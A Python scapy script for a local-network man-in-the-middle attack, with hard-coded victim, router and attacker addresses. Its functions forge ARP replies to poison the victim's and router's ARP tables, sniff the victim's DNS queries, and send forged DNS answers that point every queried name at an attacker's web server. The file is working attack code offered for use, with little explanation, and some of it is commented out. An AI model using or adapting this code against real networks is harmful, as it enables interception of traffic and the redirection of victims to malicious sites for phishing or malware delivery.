# arp_packet = ARP(
#     op=1,             # Operation code (1 for request, 2 for reply)
#     hwtype=1,        # Hardware type (1 for Ethernet)
#     ptype=2048,      # Protocol type (2048 for IPv4)
#     hwlen=6,         # Hardware address length (6 for Ethernet)
#     plen=4,          # Protocol address length (4 for IPv4)
#     hwsrc='00:00:00:00:00:00',  # Hardware source address (MAC)
#     psrc='192.168.1.1',  # Protocol source address (IP)
#     hwdst='ff:ff:ff:ff:ff:ff',  # Hardware destination address (MAC)
#     pdst='192.168.1.2'  # Protocol destination address (IP)
# )

from scapy.all import ARP, Ether, send, sniff, srp
from scapy.layers.dns import DNS,DNSQR,DNSRR,UDP,IP,TCP
import random
#from scapy.all import *
import os
import time

# Replace these with your network settings
victim_ip = "192.168.1.82"  # Victim's IP address
victim_mac = None
router_ip = "192.168.1.254"  # Router's IP address
router_mac = None
attacker_mac = "08:00:27:d1:42:d2"  # Attacker's MAC address
web_server = {
    "ip" : "192.168.1.68",
    "port" :    5000
}

def get_mac(ip):
    """Get the MAC address of the given IP."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc if answered_list else None

def arp_spoof(victim_ip, router_ip, attacker_mac):
    """Send ARP spoofing packets to the victim and the router."""
    arp_response_victim = ARP(op=2, psrc=router_ip, pdst=victim_ip, hwsrc=attacker_mac)
    arp_response_router = ARP(op=2, psrc=victim_ip, pdst=router_ip, hwsrc=attacker_mac)
    
    send(arp_response_victim, verbose=False)
    send(arp_response_router, verbose=False)

def restore_arp(victim_ip, router_ip, victim_mac, router_mac):
    """Restore the ARP tables."""
    arp_response_victim = ARP(op=2, psrc=router_ip, pdst=victim_ip, hwsrc=router_mac)
    arp_response_router = ARP(op=2, psrc=victim_ip, pdst=router_ip, hwsrc=victim_mac)
    
    send(arp_response_victim, count=5, verbose=False)
    send(arp_response_router, count=5, verbose=False)

def packet_callback(packet):
    """Callback function to handle captured packets."""
    #if packet.haslayer(IP) and packet.haslayer(TCP):
        # Check if the packet is from the victim
    if packet.haslayer(DNS) and packet[IP].src == victim_ip :
        print(random.randint(0,10000))
        print("PACKET VICTIM DNS LAYER ")
            # print(f"Victim --> Router: {packet[IP].dst} | {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}")
            
            # Modify packet if needed
            #packet[IP].dst = router_ip  # Example modification
            #packet[Ether].dst = router_mac
            #packet[Ether].src = victim_mac
            #if packet.haslayer(DNSQR):
        spoof_dns(packet)
        print('\n')
        return
            # Forward the packet to the router
            #send(packet, verbose=False)

        # Check if the packet is from the router
        #elif packet[IP].dst == victim_ip:
            # print(f"Router --> Victim: {packet[IP].src} | {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}")

            # Modify packet if needed
            #packet[IP].src = router_ip  # Example modification
            #packet[Ether].src =  router_mac
            #packet[Ether].dst = victim_mac

            # Forward the packet to the victim
            #send(packet, verbose=False)

def spoof_dns(pkt):
    """Spoof DNS responses for DNS queries."""
    #if pkt.haslayer(DNSQR):  # DNS Query Record
    qname = pkt[DNSQR].qname.decode()
    print("DNS QUERY FROM VICTIM",qname)

    # Check for the domain you want to spoof
    #if b"example.com" in qname:  
    print(f"[+] Spoofing DNS request for {qname}")
    print("pkt[UDP].sport",pkt[UDP].sport)
    print("pkt[DNS].id",pkt[DNS].id)
    # Create the DNS response
    dns_response = (
        IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # IP layer
        UDP(dport=pkt[UDP].sport, sport=53) /  # UDP layer
        DNS(
            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  # Query data from original packet
            an=DNSRR(rrname=qname, ttl=60, rdata=web_server.get("ip")),  # Spoofed response
            ns=DNSRR(rrname=qname, ttl=60, rdata=web_server.get("ip")),  # Authority section
        )
    )

    # Send the spoofed DNS response to the victim
    send(dns_response, verbose=False)
    print(f"[+] Sent spoofed DNS response with IP {web_server.get("ip")} for {qname}")



try:
    # Get the MAC addresses
    victim_mac = get_mac(victim_ip)
    router_mac = get_mac(router_ip)

    if victim_mac is None or router_mac is None:
        print("Could not find MAC addresses. Ensure the devices are reachable.")
        exit(1)

    print(" Start sniffing packets...")
    
    # Start sniffing packets
    sniff(filter="ip", prn=packet_callback, store=0)

except KeyboardInterrupt:
    print("\nStopping ARP spoofing...")
    restore_arp(victim_ip, router_ip, victim_mac, router_mac)
